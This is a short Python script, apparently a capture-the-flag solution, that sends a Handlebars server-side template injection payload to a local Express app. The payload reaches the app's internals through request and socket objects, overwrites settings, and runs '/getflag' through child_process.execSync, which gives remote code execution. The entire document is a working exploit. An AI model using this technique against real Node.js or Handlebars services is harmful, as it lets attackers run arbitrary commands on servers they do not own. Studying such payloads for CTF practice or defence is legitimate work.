import requests

print(requests.get("http://localhost:8000/", params={
    "x": """
{{#with req.socket.server._events.request.request.app.locals}}
    {{#with (../req.socket.server._events.request.request.app.set "settings" ../req.socket._events.error)}}{{/with}}
    {{#with (../req.socket.server._events.request.request.app.set "listenerCount" ../req.socket.server._events.request.request.app.set)}}{{/with}}
    {{#with (../req.socket.server._events.request.request.app.set "listenerCount" (../req.socket.server._events.request.constructor.listenerCount settings "constructor"))}}{{/with}}
    {{#with (../req.socket.server._events.request.constructor.listenerCount settings "(function () {throw new Error(process.mainModule.require('child_process').execSync('/getflag').toString())})()")}}{{/with}}
{{/with}}
"""}).text)